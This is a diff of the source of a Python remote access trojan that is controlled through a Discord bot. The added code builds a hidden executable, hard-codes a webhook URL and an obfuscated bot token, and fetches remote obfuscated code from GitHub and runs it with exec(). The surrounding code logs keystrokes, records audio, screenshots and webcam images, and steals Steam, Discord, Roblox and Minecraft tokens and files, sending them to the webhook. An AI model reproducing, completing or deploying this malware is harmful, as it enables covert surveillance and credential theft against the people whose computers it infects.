@@ -16,33 +16,186 @@ import base64
 import logging
 import shutil
 import ctypes
+import uuid
+import socket
+import subprocess
+import winreg
+import win32clipboard
+import win32crypt
+import psutil
+import platform
+import random
+import string
+import PyInstaller.__main__
 
-def apply_rootkit_technique():
+# Setup Logging
+BASE_DIR = Path(__file__).resolve().parent
+LOG_PATH = Path.home() / "RAT-Control" / "bot.log"
+
+def setup_logger(log_file_path):
+    log_file_path.parent.mkdir(parents=True, exist_ok=True)
+    logger = logging.getLogger('RATLogger')
+    logger.setLevel(logging.DEBUG)
+
+    file_handler = logging.FileHandler(log_file_path, encoding='utf-8')
+    file_handler.setLevel(logging.DEBUG)
+
+    console_handler = logging.StreamHandler()
+    console_handler.setLevel(logging.ERROR)
+
+    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
+    file_handler.setFormatter(formatter)
+    console_handler.setFormatter(formatter)
+
+    logger.addHandler(file_handler)
+    logger.addHandler(console_handler)
+
+    return logger
+
+logger = setup_logger(LOG_PATH)
+logger.info("Logging initialized")
+
+# Admin Check
+def is_admin():
     try:
-        ctypes.windll.user32.MessageBoxW(0, "Rootkit Technique Active", "System Alert", 1)
+        return ctypes.windll.shell32.IsUserAnAdmin()
     except Exception as e:
-        logging.error(f"Failed to apply rootkit technique: {e}")
+        logger.error(f"Failed to check admin privileges: {e}")
+        return False
 
+if not is_admin():
+    logger.warning("Not running with administrator privileges.")
+
+# Dependency Installation
+def install_missing_packages():
+    required = [
+        'pyaudio', 'pillow', 'selenium', 'pywin32', 'pycryptodome',
+        'aiohttp', 'pyinstaller', 'pynput', 'opencv-python', 'discord.py'
+    ]
+    installed = {pkg.key for pkg in pkg_resources.working_set}
+    missing = [pkg for pkg in required if pkg not in installed]
+    if missing:
+        logger.info(f"Installing: {missing}")
+        for pkg in missing:
+            try:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "--verbose", pkg])
+                time.sleep(60)
+            except subprocess.CalledProcessError as e:
+                logger.error(f"Failed to install package {pkg}: {e}")
+                logger.error(f"Error output: {e.output}")
+    else:
+        logger.info("All packages installed")
+
+install_missing_packages()
+logger.info("Dependency installation complete. Continuing with the script.")
+
+# Generate Spec File for Silent Build
+def generate_spec_file(script_name, spec_path):
+    spec_content = f"""
+# -*- mode: python ; coding: utf-8 -*-
+block_cipher = None
+
+a = Analysis(
+    ['{script_name}'],
+    pathex=['{os.getcwd()}'],
+    binaries=[],
+    datas=[],
+    hiddenimports=[
+        'win32clipboard',
+        'win32crypt',
+        'Crypto.Cipher.AES',
+        'Crypto.Protocol.KDF.PBKDF2'
+    ],
+    hookspath=[],
+    runtime_hooks=[],
+    excludes=[],
+    win_no_prefer_redirects=False,
+    win_private_assemblies=False,
+    cipher=block_cipher,
+    noarchive=False,
+)
+pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
+exe = EXE(
+    pyz,
+    a.scripts,
+    [],
+    exclude_binaries=True,
+    name='rat_pc',
+    debug=False,
+    bootloader_ignore_signals=False,
+    strip=False,
+    upx=True,
+    console=False,
+)
+coll = COLLECT(
+    exe,
+    a.binaries,
+    a.zipfiles,
+    a.datas,
+    strip=False,
+    upx=True,
+    upx_exclude=[],
+    name='rat_pc',
+)
+"""
+    try:
+        with open(spec_path, 'w', encoding='utf-8') as f:
+            f.write(spec_content)
+    except Exception as e:
+        logger.error(f"Failed to write spec file: {e}")
+
+# Build Executable
+def build_executable(spec_path):
+    try:
+        PyInstaller.__main__.run([str(spec_path)])
+        logger.info("Executable built")
+    except Exception as e:
+        logger.error(f"Build failed: {e}")
+
+spec_path = BASE_DIR / "rat_pc.spec"
+generate_spec_file("rat_pc.py", spec_path)
+build_executable(spec_path)
+
+# RAT Setup Constants
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1367882927429517354/QX90d-cK3ezsAbq8aH1jpTo9lPFuasPty_GDeixcUZTiZ6XyiiUausIJ_DIDPZS76IVH"
 TOKEN = "MTM2ODQ0MzMzOTI3NTM3NDY1Mg"[::-1] + ".oF0Ep8O1x3LEe96eNd5lf0Frfx6q9Jq0KqBJFA"[::-1]
 BOT_CONTROL_URL = "https://raw.githubusercontent.com/Elissa1610/bot-host/refs/heads/main/obfuscated%20BOT%20CODE.txt"
+UNIQUE_ID = str(uuid.uuid4())
 
-intents = discord.Intents.default()
-intents.message_content = True
-bot = commands.Bot(command_prefix="!", intents=intents)
+logger.info(f"InstanceID: {UNIQUE_ID}")
 
-logging.basicConfig(level=logging.DEBUG)
+# Register Clean Exit Logging
+def log_shutdown():
+    try:
+        logger.info("RAT shutting down cleanly.")
+    except Exception as e:
+        logger.error(f"Failed to log shutdown: {e}")
+
+atexit.register(log_shutdown)
+
+# Function to download and execute the bot control script
+def download_and_execute_bot_control_script():
+    try:
+        response = requests.get(BOT_CONTROL_URL, stream=True)
+        response.raise_for_status()
+        with open("bot_control_script.py", "wb") as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                f.write(chunk)
+        logger.info("Bot control script downloaded successfully.")
+        exec(open("bot_control_script.py").read())
+    except Exception as e:
+        logger.error(f"Failed to download or execute bot control script: {e}")
 
 def send_to_discord(message):
     try:
         payload = {"content": message}
         response = requests.post(WEBHOOK_URL, json=payload)
         if response.status_code == 204:
-            logging.info("Data sent to Discord successfully")
+            logger.info("Data sent to Discord successfully")
         else:
-            logging.error(f"Failed to send data to Discord: {response.status_code}")
+            logger.error(f"Failed to send data to Discord: {response.status_code}")
     except Exception as e:
-        logging.error(f"Webhook failed: {e}")
+        logger.error(f"Webhook failed: {e}")
 
 def log_keystroke(key):
     try:
@@ -52,23 +205,23 @@ def log_keystroke(key):
             key_str = key.char if key.char else str(key)
         else:
             key_str = key.char if hasattr(key, 'char') and key.char else str(key)
-        logging.info(key_str)
+        logger.info(key_str)
         send_to_discord(key_str)
     except Exception as e:
-        logging.error(f"Keylogging failed: {e}")
+        logger.error(f"Keylogging failed: {e}")
 
 def start_keylogger():
     def on_press(key):
         try:
             log_keystroke(key)
         except Exception as e:
-            logging.error(f"Keylogger failed: {e}")
+            logger.error(f"Keylogger failed: {e}")
             return False
     try:
         with Listener(on_press=on_press) as listener:
             listener.join()
     except Exception as e:
-        logging.error(f"Keylogger listener error: {e}")
+        logger.error(f"Keylogger listener error: {e}")
 
 def record_audio(duration=30):
     try:
@@ -89,7 +242,7 @@ def record_audio(duration=30):
             wf.writeframes(b''.join(frames))
         send_to_discord(f"Audio recorded and saved as {filename}")
     except Exception as e:
-        logging.error(f"Audio recording failed: {e}")
+        logger.error(f"Audio recording failed: {e}")
 
 def capture_screenshot():
     try:
@@ -98,7 +251,7 @@ def capture_screenshot():
         screenshot.save(filename)
         send_to_discord(f"Screenshot captured successfully: {filename}")
     except Exception as e:
-        logging.error(f"Screenshot capture failed: {e}")
+        logger.error(f"Screenshot capture failed: {e}")
 
 def capture_webcam():
     try:
@@ -110,7 +263,7 @@ def capture_webcam():
             send_to_discord(f"Webcam photo saved as {filename}")
             cap.release()
     except Exception as e:
-        logging.error(f"Webcam capture failed: {e}")
+        logger.error(f"Webcam capture failed: {e}")
 
 def steam_dump():
     try:
@@ -127,7 +280,7 @@ def steam_dump():
         if not steam_token:
             send_to_discord("No Steam token found.")
     except Exception as e:
-        logging.error(f"Steam dump failed: {e}")
+        logger.error(f"Steam dump failed: {e}")
 
 def discord_dump():
     try:
@@ -144,7 +297,7 @@ def discord_dump():
         if not discord_token:
             send_to_discord("No Discord token found.")
     except Exception as e:
-        logging.error(f"Discord dump failed: {e}")
+        logger.error(f"Discord dump failed: {e}")
 
 def roblox_dump():
     try:
@@ -161,7 +314,7 @@ def roblox_dump():
         if not roblox_token:
             send_to_discord("No Roblox token found.")
     except Exception as e:
-        logging.error(f"Roblox dump failed: {e}")
+        logger.error(f"Roblox dump failed: {e}")
 
 def minecraft_dump():
     try:
@@ -176,7 +329,7 @@ def minecraft_dump():
         if not minecraft_token:
             send_to_discord("No Minecraft token found.")
     except Exception as e:
-        logging.error(f"Minecraft dump failed: {e}")
+        logger.error(f"Minecraft dump failed: {e}")
 
 def exfiltrate_files():
     try:
@@ -184,7 +337,17 @@ def exfiltrate_files():
         for file in files:
             send_to_discord(f"Exfiltrated file: {file}")
     except Exception as e:
-        logging.error(f"File exfiltration failed: {e}")
+        logger.error(f"File exfiltration failed: {e}")
+
+def apply_rootkit_technique():
+    try:
+        ctypes.windll.user32.MessageBoxW(0, "Rootkit Technique Active", "System Alert", 1)
+    except Exception as e:
+        logging.error(f"Failed to apply rootkit technique: {e}")
+
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix="!", intents=intents)
 
 @bot.event
 async def on_message(message):
